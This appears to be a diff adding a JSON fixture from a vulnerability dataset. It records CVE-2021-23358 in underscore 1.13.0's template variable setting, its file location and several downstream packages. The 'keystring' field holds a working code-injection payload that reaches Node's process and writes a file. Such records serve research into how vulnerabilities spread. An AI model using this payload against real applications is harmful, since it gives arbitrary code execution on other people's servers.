@@ -1,0 +1,14 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.13.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "anuma-desktop@1.0.0",
+    "express-permission-rules@2.0.0",
+    "jcf_generator_cli@1.0.0",
+    "jwi-ui@0.6.419",
+    "@pattern-lab/engine-underscore@5.14.3"
+  ]
+}
